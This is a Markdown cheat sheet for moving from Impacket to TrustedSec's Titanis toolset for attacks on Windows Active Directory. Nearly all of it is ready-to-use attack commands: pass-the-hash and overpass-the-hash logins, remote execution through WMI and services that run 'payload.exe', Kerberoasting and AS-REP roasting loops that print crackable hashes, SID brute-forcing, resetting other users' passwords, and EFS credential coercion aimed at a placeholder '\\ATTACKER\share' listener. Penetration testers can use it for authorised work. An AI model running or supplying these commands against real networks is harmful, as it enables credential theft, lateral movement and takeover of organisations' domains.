# Impacket → Titanis Transition Cheat Sheet

**Titanis** is TrustedSec's C#/.NET 8 cross-platform replacement for Impacket's Python toolset.
It runs natively on Windows and Linux without Python dependencies.

Key behavioral differences:
- Auth is explicit — no session fallback, no implicit AD lookups
- Both `.kirbi` and `.ccache` ticket files work natively (no conversion needed)
- `KRB5CCNAME` env var is honoured — set it to keep a per-user cache
- Kerberos only activates when `-Kdc` is specified
- Output format is selectable: `-OutputStyle Table|Json|Csv|Tsv|List|Raw`
- Tool names are PascalCase verbs: `Wmi`, `Kerb`, `Smb2Client`, `Lsa`, `Sam`, `Scm`, `Epm`, `CredCoerce`

---

## Authentication Quick Reference

### Titanis

```
# Password (NTLM or Kerberos, depending on -Kdc)
-UserName DOMAIN\user -Password pass
-UserName user@DOMAIN -Password pass
-UserName user -UserDomain DOMAIN -Password pass

# NTLM hash — pass-the-hash (NTLM only, no colons, no LM)
-UserName DOMAIN\user -NtlmHash <nthash>

# NTLM hash + Kerberos RC4 (overpass-the-hash)
-UserName DOMAIN\user -NtlmHash <nthash> -Kdc DC

# AES key (Kerberos only)
-UserName DOMAIN\user -AesKey <aeskey> -Kdc DC

# Ticket file (TGT — Titanis requests service tickets automatically)
-UserName DOMAIN\user -Tgt user.kirbi -Kdc DC

# Ticket cache (kirbi or ccache, reused across commands)
-TicketCache user.ccache -Kdc DC
export KRB5CCNAME=user.ccache    # then omit -TicketCache from the command line

# Force IPv4 or IPv6
-4    -6

# SOCKS5 proxy
-Socks5 127.0.0.1:1080
```

### Impacket

```
# Password
domain/user:pass@TARGET

# NTLM hash — pass-the-hash
-hashes :nthash        # NT only
-hashes lmhash:nthash  # LM:NT

# AES key
-aesKey <aeskey>

# Kerberos ticket (ccache)
export KRB5CCNAME=user.ccache
tool.py -k -no-pass domain/user@TARGET

# DC specification
-dc-ip 10.0.0.1
```

---

## Remote Code Execution

### WMI Exec (`wmiexec.py` → `Wmi exec`)

Executes a command via WMI Win32_Process.Create. Output is captured through a temp file on the
remote ADMIN$ share and streamed back.

| Impacket | Titanis |
|----------|---------|

**Password**

```bash
# Impacket
wmiexec.py DOMAIN/user:pass@TARGET 'whoami'

# Titanis
Wmi exec TARGET 'whoami' -UserName DOMAIN\user -Password pass
```

**Pass-the-Hash**

```bash
# Impacket
wmiexec.py -hashes :nthash DOMAIN/user@TARGET 'whoami'

# Titanis
Wmi exec TARGET 'whoami' -UserName DOMAIN\user -NtlmHash <nthash>
```

**Kerberos Ticket**

```bash
# Impacket
export KRB5CCNAME=user.ccache
wmiexec.py -k -no-pass DOMAIN/user@TARGET 'whoami'

# Titanis
Wmi exec TARGET 'whoami' -TicketCache user.ccache -Kdc DC
```

> Titanis flags: `-CmdCall:off` to skip `cmd /q /c` wrapper; `-CaptureOutput:off` for fire-and-forget; `-Wait:off` for async.

---

### Service-Based Exec / PsExec-style (`psexec.py` / `smbexec.py` → `Scm create`)

Impacket's psexec and smbexec deploy a service binary. The Titanis equivalent is `Scm create`
with `-Start` to create and immediately start the service.

**Password**

```bash
# Impacket
psexec.py DOMAIN/user:pass@TARGET
smbexec.py DOMAIN/user:pass@TARGET

# Titanis — create a service and start it
Scm create TARGET mySvc 'C:\Windows\Temp\payload.exe' \
    -Start -UserName DOMAIN\user -Password pass

# Cleanup
Scm stop   TARGET mySvc -UserName DOMAIN\user -Password pass
Scm delete TARGET mySvc -UserName DOMAIN\user -Password pass
```

**Pass-the-Hash**

```bash
# Impacket
psexec.py -hashes :nthash DOMAIN/user@TARGET

# Titanis
Scm create TARGET mySvc 'C:\Windows\Temp\payload.exe' \
    -Start -UserName DOMAIN\user -NtlmHash <nthash>
```

**Kerberos Ticket**

```bash
# Impacket
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass DOMAIN/user@TARGET

# Titanis
Scm create TARGET mySvc 'C:\Windows\Temp\payload.exe' \
    -Start -TicketCache user.ccache -Kdc DC
```

---

## Kerberos Attacks

### Request TGT (`getTGT.py` → `Kerb asreq`)

```bash
# Impacket — password
getTGT.py DOMAIN/user:pass -dc-ip DC
# output: user.ccache

# Impacket — NTLM hash
getTGT.py -hashes :nthash DOMAIN/user -dc-ip DC

# Impacket — AES key
getTGT.py -aesKey <aeskey> DOMAIN/user -dc-ip DC
```

```bash
# Titanis — password
Kerb asreq user@DOMAIN DC -Password pass -OutputFileName user.kirbi -Overwrite

# Titanis — NTLM hash (RC4 TGT)
Kerb asreq user@DOMAIN DC -NtlmHash <nthash> -OutputFileName user.kirbi -Overwrite

# Titanis — NTLM hash, request RC4 explicitly
Kerb asreq user@DOMAIN DC -NtlmHash <nthash> -EncTypes Rc4Hmac \
    -OutputFileName user.kirbi -Overwrite

# Titanis — AES 256 key
Kerb asreq user@DOMAIN DC -AesKey <aeskey256> -OutputFileName user.kirbi -Overwrite

# Titanis — AES 128 key
Kerb asreq user@DOMAIN DC -AesKey <aeskey128> \
    -EncTypes Aes128CtsHmacSha1_96 -OutputFileName user.kirbi -Overwrite
```

> Kerb asreq uses positional args: `<UserName@Realm> <Kdc>`.
> Use `-Realm DOMAIN` to set the realm separately when the username has no `@domain`.

---

### Request Service Ticket (`getST.py` → `Kerb tgsreq`)

```bash
# Impacket
getST.py -spn cifs/TARGET -dc-ip DC DOMAIN/user:pass
getST.py -spn cifs/TARGET -hashes :nthash -dc-ip DC DOMAIN/user
getST.py -spn cifs/TARGET -k -no-pass -dc-ip DC DOMAIN/user

# S4U2proxy (impersonation)
getST.py -spn cifs/TARGET -impersonate Administrator \
    -dc-ip DC DOMAIN/svc_account:pass
```

```bash
# Titanis — from TGT file
Kerb tgsreq DC cifs/TARGET -Tgt user.kirbi -OutputFileName user-cifs.kirbi

# Titanis — multiple SPNs in one shot
Kerb tgsreq DC 'cifs/TARGET, host/TARGET' \
    -Tgt user.kirbi -OutputFileName user-cifs.kirbi

# Titanis — using a ticket cache (requests TGT automatically if missing)
Kerb tgsreq DC cifs/TARGET -TicketCache user.ccache \
    -UserName DOMAIN\user -Password pass -Kdc DC

# Titanis — S4U2proxy (impersonate Administrator via service account)
Wmi exec TARGET whoami \
    -UserName DOMAIN\svc_account -Password pass -Kdc DC \
    -S4UserName Administrator@DOMAIN -S4ProxyService host/TARGET
```

---

### Kerberoasting (`GetUserSPNs.py` → `Kerb tgsreq` + `Kerb select`)

Impacket discovers and requests all service tickets in one pass. With Titanis, you enumerate
SPNs via LDAP or `Sam`/`Lsa`, then request tickets and extract hashes separately.

```bash
# Impacket — enumerate and request all SPNs, print hashes
GetUserSPNs.py -request DOMAIN/user:pass -dc-ip DC
GetUserSPNs.py -request -hashes :nthash DOMAIN/user -dc-ip DC
GetUserSPNs.py -request -k -no-pass DOMAIN/user -dc-ip DC
```

```bash
# Titanis — step 1: get TGT
Kerb asreq user@DOMAIN DC -Password pass -OutputFileName user.kirbi -Overwrite

# Titanis — step 2: request RC4-encrypted service ticket (weakest, most crackable)
Kerb tgsreq DC 'MSSQLSvc/sql01.DOMAIN:1433' \
    -Tgt user.kirbi -EncTypes Rc4Hmac -OutputFileName svc.kirbi -Overwrite

# Titanis — step 3: extract Hashcat-ready hash
Kerb select -From svc.kirbi -OutputFields TicketHash
```

> The `TicketHash` field outputs in `$krb5tgs$23$*...*` format, directly usable with Hashcat mode 13100.

---

### AS-REP Roasting (`GetNPUsers.py` → `Kerb asreq` without preauth)

Targets accounts with "Do not require Kerberos preauthentication" set. The AS-REP contains
an encrypted blob crackable offline.

```bash
# Impacket — enumerate and request AS-REPs for all no-preauth accounts
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC -no-pass -format hashcat
GetNPUsers.py DOMAIN/user:pass -dc-ip DC -request -format hashcat
```

```bash
# Titanis — request TGT without password; succeeds only if preauth is not required
Kerb asreq targetuser@DOMAIN DC -OutputFileName asrep.kirbi -Overwrite

# Titanis — extract the AS-REP hash for cracking (Hashcat mode 18200)
Kerb select -From asrep.kirbi -OutputFields TicketHash

# Repeat for each candidate account in a loop:
for user in $(cat users.txt); do
    Kerb asreq "${user}@DOMAIN" DC -OutputFileName "${user}.kirbi" -Overwrite 2>/dev/null \
    && Kerb select -From "${user}.kirbi" -OutputFields TicketHash
done
```

---

### Key Derivation (`n/a` → `Kerb s2k`)

Derives Kerberos AES/RC4 keys from a password and salt. No Impacket equivalent (use Rubeus or
mimikatz offline).

```bash
# Titanis — generate all key types for a user
Kerb s2k DOMAIN.COMuser pass

# Titanis — AES keys only
Kerb s2k DOMAIN.COMuser pass -EncTypes Aes128CtsHmacSha1_96, Aes256CtsHmacSha1_96

# Titanis — computer account (salt includes "host" prefix + FQDN)
Kerb s2k DOMAIN.COMhostDC01.domain.com 'machinepassword!'
```

> Get the correct salt for an account first with `Kerb getasinfo user@DOMAIN DC`.
> The Windows salt is typically `DOMAIN.FQDNusername` (FQDN uppercase, username lowercase, no separator).

---

### Ticket Renewal (`n/a` → `Kerb renew`)

No Impacket equivalent. Renews a renewable ticket before it expires.

```bash
# Titanis — renew all tickets in a file
Kerb renew DC -Ticket user.kirbi -OutputFileName user.kirbi -Overwrite

# Titanis — renew specific SPNs from a cache
Kerb renew DC -TicketCache user.ccache -TargetSpn 'cifs/TARGET'
```

---

### Password Change via Kerberos (`changepasswd.py` → `Kerb changepw` / `Kerb setpw`)

```bash
# Impacket — change own password (Kerberos Change Password)
changepasswd.py -k -no-pass DOMAIN/user@DC -newpassword 'NewPass1!'

# Impacket — set another user's password (requires appropriate privs)
changepasswd.py DOMAIN/admin:AdminPass@DC -altuser targetuser \
    -altpass OldPass -newpassword 'NewPass1!'
```

```bash
# Titanis — change OWN password (requires current creds, no TGT)
Kerb changepw user@DOMAIN DC 'NewPass1!' -Password 'OldPass'
Kerb changepw user@DOMAIN DC 'NewPass1!' -NtlmHash <nthash>

# Titanis — set ANOTHER user's password (more flexible, accepts TGT)
Kerb setpw targetuser@DOMAIN 'NewPass1!' \
    -UserName DOMAIN\admin -Password AdminPass -Kdc DC

# Titanis — set another user's password using existing TGT
Kerb setpw targetuser@DOMAIN 'NewPass1!' -Tgt admin.kirbi -Kdc DC
```

---

## Ticket Format Conversion (`ticketConverter.py` → `Kerb select`)

Impacket's `ticketConverter.py` converts between `.kirbi` (Windows) and `.ccache` (MIT/UNIX)
formats. Titanis reads both natively and converts by specifying the output extension.

```bash
# Impacket
ticketConverter.py user.kirbi user.ccache
ticketConverter.py user.ccache user.kirbi
```

```bash
# Titanis — kirbi → ccache
Kerb select -From user.kirbi -Into user.ccache -Overwrite

# Titanis — ccache → kirbi
Kerb select -From user.ccache -Into user.kirbi -Overwrite

# Titanis — combine multiple files into one cache
Kerb select -From '*.kirbi' -Into combined.ccache -Overwrite

# Titanis — inspect tickets (show SPN, user, expiry, enc type)
Kerb select -From user.kirbi

# Titanis — show only currently-valid tickets
Kerb select -From user.ccache -Current

# Titanis — filter by SPN (regex)
Kerb select -From '*.kirbi' -MatchingSpn 'cifs/.*'
```

---

## SMB File Operations (`smbclient.py` → `Smb2Client`)

The Titanis `Smb2Client` uses UNC paths: `\\SERVER\SHARE\path`

### Enumerate Shares

```bash
# Impacket
smbclient.py DOMAIN/user:pass@TARGET -no-pass
# then: shares

# Titanis
Smb2Client enumshares TARGET -UserName DOMAIN\user -Password pass
Smb2Client enumshares TARGET -UserName DOMAIN\user -NtlmHash <nthash>
Smb2Client enumshares TARGET -TicketCache user.ccache -Kdc DC
```

### List Directory

```bash
# Impacket
smbclient.py DOMAIN/user:pass@TARGET
# then: use C$; ls

# Titanis
Smb2Client ls '\\TARGET\C$' -UserName DOMAIN\user -Password pass
Smb2Client ls '\\TARGET\C$\Windows\Temp' -UserName DOMAIN\user -NtlmHash <nthash>
Smb2Client ls '\\TARGET\C$' -TicketCache user.ccache -Kdc DC
```

### Download File

```bash
# Impacket (interactive)
smbclient.py DOMAIN/user:pass@TARGET
# then: use C$; get Windows\Temp\loot.txt

# Titanis
Smb2Client get '\\TARGET\C$\Windows\Temp\loot.txt' ./loot.txt \
    -UserName DOMAIN\user -Password pass
```

### Upload File

```bash
# Impacket (interactive)
# then: put payload.exe Windows\Temp\payload.exe

# Titanis
Smb2Client put payload.exe '\\TARGET\C$\Windows\Temp\payload.exe' \
    -UserName DOMAIN\user -Password pass
```

### Delete / Make Directory

```bash
# Impacket (interactive)
# then: rm Windows\Temp\old.txt; mkdir Windows\Temp\newdir

# Titanis
Smb2Client rm '\\TARGET\C$\Windows\Temp\old.txt' \
    -UserName DOMAIN\user -Password pass
Smb2Client mkdir '\\TARGET\C$\Windows\Temp\newdir' \
    -UserName DOMAIN\user -Password pass
```

### Enumerate Sessions / Open Files / Snapshots

```bash
# Titanis — active sessions on server
Smb2Client enumsessions TARGET -UserName DOMAIN\user -Password pass

# Titanis — open files on server
Smb2Client enumopenfiles TARGET -UserName DOMAIN\user -Password pass

# Titanis — snapshots for a path (VSS)
Smb2Client enumsnapshots '\\TARGET\C$\Windows' -UserName DOMAIN\user -Password pass
```

---

## Enumeration

### SID Lookup (`lookupsid.py` → `Lsa lookupsid` / `Lsa lookupname`)

```bash
# Impacket
lookupsid.py DOMAIN/user:pass@TARGET
lookupsid.py -hashes :nthash DOMAIN/user@TARGET
```

```bash
# Titanis — translate SIDs to names
Lsa lookupsid TARGET S-1-5-21-111-222-333-500 S-1-5-21-111-222-333-1103 \
    -UserName DOMAIN\user -Password pass

# Titanis — brute-force enumerate domain SIDs (like lookupsid.py)
for i in $(seq 500 1200); do
    Lsa lookupsid TARGET "S-1-5-21-<domain_rid>-${i}" \
        -UserName DOMAIN\user -NtlmHash <nthash> 2>/dev/null
done

# Titanis — reverse lookup: name → SID
Lsa lookupname TARGET user Administrator \
    -UserName DOMAIN\user -Password pass

# Titanis — with Kerberos
Lsa lookupsid TARGET S-1-5-21-111-222-333-1103 \
    -TicketCache user.ccache -Kdc DC
```

### User Enumeration via SAMR (`samrdump.py` → `Sam enumusers`)

```bash
# Impacket
samrdump.py DOMAIN/user:pass@TARGET
samrdump.py -hashes :nthash DOMAIN/user@TARGET
```

```bash
# Titanis — enumerate users
Sam enumusers TARGET -UserName DOMAIN\user -Password pass
Sam enumusers TARGET -UserName DOMAIN\user -NtlmHash <nthash>
Sam enumusers TARGET -TicketCache user.ccache -Kdc DC

# Titanis — table output with specific fields
Sam enumusers TARGET -UserName DOMAIN\user -Password pass \
    -OutputStyle Table -OutputFields AccountName, FullName, LastLogon
```

### RPC Endpoint Mapping (`rpcdump.py` → `Epm lsep`)

```bash
# Impacket
rpcdump.py DOMAIN/user:pass@TARGET
rpcdump.py -hashes :nthash DOMAIN/user@TARGET
```

```bash
# Titanis — list all registered RPC endpoints
Epm lsep TARGET -UserName DOMAIN\user -Password pass
Epm lsep TARGET -UserName DOMAIN\user -NtlmHash <nthash>
Epm lsep TARGET -TicketCache user.ccache -Kdc DC

# Titanis — filter by interface ID
Epm lsep TARGET -UserName DOMAIN\user -Password pass \
    -InterfaceId 12345678-1234-1234-1234-123456789abc

# Titanis — table output
Epm lsep TARGET -UserName DOMAIN\user -Password pass -OutputStyle Table
```

### LSA Account Enumeration (Titanis-only)

No direct Impacket equivalent. Retrieves accounts with assigned privileges.

```bash
# Titanis — enumerate all accounts in LSA database
Lsa enumaccounts TARGET -UserName DOMAIN\user -Password pass

# Titanis — with names and domains
Lsa enumaccounts TARGET -UserName DOMAIN\user -Password pass \
    -OutputFields Sid, AccountName, DomainName

# Titanis — enumerate accounts holding a specific privilege
Lsa enumprivaccounts TARGET -Privilege SeDebugPrivilege \
    -UserName DOMAIN\user -Password pass
Lsa enumprivaccounts TARGET -Privilege SeInteractiveLogonRight \
    -UserName DOMAIN\user -NtlmHash <nthash>
```

### WMI Queries (`wmiquery.py` → `Wmi query`)

```bash
# Impacket
wmiquery.py -query 'SELECT * FROM Win32_Process' DOMAIN/user:pass@TARGET
```

```bash
# Titanis
Wmi query TARGET 'SELECT * FROM Win32_Process' \
    -UserName DOMAIN\user -Password pass
Wmi query TARGET 'SELECT * FROM Win32_Process' \
    -UserName DOMAIN\user -NtlmHash <nthash>
Wmi query TARGET 'SELECT * FROM Win32_Process' \
    -TicketCache user.ccache -Kdc DC

# Titanis — custom namespace
Wmi query TARGET 'SELECT * FROM AntiVirusProduct' \
    -Namespace 'root\SecurityCenter2' \
    -UserName DOMAIN\user -Password pass

# Titanis — machine info
Wmi query TARGET 'SELECT * FROM Win32_OperatingSystem' \
    -UserName DOMAIN\user -Password pass -OutputStyle Table
```

---

## Service Management (`services.py` → `Scm`)

```bash
# Impacket
services.py DOMAIN/user:pass@TARGET list
services.py DOMAIN/user:pass@TARGET status <svc>
services.py DOMAIN/user:pass@TARGET start <svc>
services.py DOMAIN/user:pass@TARGET stop <svc>
services.py DOMAIN/user:pass@TARGET create <svc> binPath= 'C:\path\to\exe.exe'
services.py DOMAIN/user:pass@TARGET delete <svc>
```

```bash
# Titanis — query service status
Scm query TARGET mySvc -UserName DOMAIN\user -Password pass

# Titanis — start / stop
Scm start TARGET mySvc -UserName DOMAIN\user -Password pass
Scm stop  TARGET mySvc -UserName DOMAIN\user -NtlmHash <nthash>

# Titanis — create service (and start immediately)
Scm create TARGET mySvc 'C:\Windows\Temp\payload.exe' \
    -Start -UserName DOMAIN\user -Password pass

# Titanis — create with custom service account
Scm create TARGET mySvc 'C:\Windows\Temp\payload.exe' \
    -StartName 'DOMAIN\svc_user' -StartPassword 'SvcPass!' \
    -Start -UserName DOMAIN\user -Password pass

# Titanis — delete service
Scm delete TARGET mySvc -UserName DOMAIN\user -Password pass

# Titanis — all auth variants work the same way
Scm query TARGET mySvc -UserName DOMAIN\user -NtlmHash <nthash>
Scm query TARGET mySvc -TicketCache user.ccache -Kdc DC
```

---

## Credential Coercion (Titanis-only: `CredCoerce`)

No Impacket equivalent. Uses EFS (MS-EFSR) RPC calls to coerce a target to authenticate to
an arbitrary UNC path (for relay, capture, etc.).

```bash
# Titanis — coerce all EFS techniques toward your listener
CredCoerce -Techniques '*' TARGET '\\ATTACKER\share' \
    -UserName DOMAIN\user -Password pass

# Titanis — specific EFS method only
CredCoerce -Techniques 'Efs.OpenFile' TARGET '\\ATTACKER\share' \
    -UserName DOMAIN\user -NtlmHash <nthash>

# Titanis — with Kerberos auth to the victim (coerce goes to ATTACKER)
CredCoerce -Techniques '*' TARGET '\\ATTACKER\share' \
    -TicketCache user.ccache -Kdc DC

# All available techniques:
#   Efs.OpenFile            Efs.EncryptFile         Efs.DecryptFile
#   Efs.QueryUsersOnFile    Efs.QueryRecoveryAgents Efs.RemoveUsersFromFile
#   Efs.AddUsersToFile      Efs.FileKeyInfo         Efs.DuplicateEncryptionInfoFile
#   Efs.AddUsersToFileEx    Efs.FileKeyInfoEx       Efs.GetEncryptedFileMetadata
#   Efs.SetEncryptedFileMetadata                    Efs.EncryptFileExSrv
```

---

## Still Impacket Only

> The following tools have **no Titanis equivalent** as of early 2026.
> Continue using Impacket for these.

| Tool | Purpose |
|------|---------|
| `secretsdump.py` | Remote NTDS/SAM/LSA secrets dump (DCSync, shadow copy, registry) |
| `ntlmrelayx.py` | NTLM relay attacks, SMB/HTTP/LDAP relay chains |
| `ticketer.py` | Golden ticket / Silver ticket forging |
| `reg.py` | Remote registry read/write |
| `dacledit.py` | ACL/DACL modification on AD objects |
| `rbcd.py` | Resource-based constrained delegation attacks |
| `addcomputer.py` | Machine account creation via LDAP/SAMR |
| `raiseChild.py` | Child domain to forest root escalation (MS14-068) |
| `goldenPac.py` | MS14-068 Kerberos privilege escalation |
| `atexec.py` | Remote command via Task Scheduler (AT service) |
| `dcomexec.py` | Remote command via DCOM (MMC20, ShellWindows, ShellBrowserWindow) |
| `GetLAPSPassword.py` | Read LAPS passwords from AD |
| `Get-GPPPassword.py` | Extract credentials from Group Policy Preferences |
| `findDelegation.py` | Enumerate Kerberos delegation configurations |
| `dpapi.py` | DPAPI masterkey/credential/vault decryption |
| `mssqlclient.py` | Interactive MSSQL client (xp_cmdshell, file ops) |
| `ntfs-read.py` | Direct NTFS read via Volume Shadow Copy |
